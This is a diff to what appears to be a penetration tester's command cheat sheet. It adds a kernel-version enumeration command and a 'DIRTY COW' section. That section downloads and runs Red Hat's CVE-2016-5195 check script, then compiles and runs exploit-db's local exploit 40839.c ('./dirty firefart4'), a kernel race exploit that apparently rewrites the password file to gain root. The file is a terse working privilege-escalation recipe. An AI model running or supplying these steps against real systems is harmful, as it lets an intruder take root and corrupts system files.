@@ -852,6 +852,7 @@ cat /proc/version
 uname -a
 uname -mrs
 rpm -q kernel
+rpm -q kernel --last
 dmesg | grep Linux
 ls /boot | grep vmlinuz-
 #env vars
@@ -1480,4 +1481,15 @@ Ax1024+
 
 
 
+##############################
+#### DIRTY COW         #######
+##############################
+#Check RHEL
+wget https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+chmod +x rh-cve-2016-5195_5.sh
+./rh-cve-2016-5195_5.sh
+
+/usr/share/exploitdb/exploits/linux/local/40839.c
+gcc -pthread 40839.c -o dirty -lcrypt
+./dirty firefart4
 
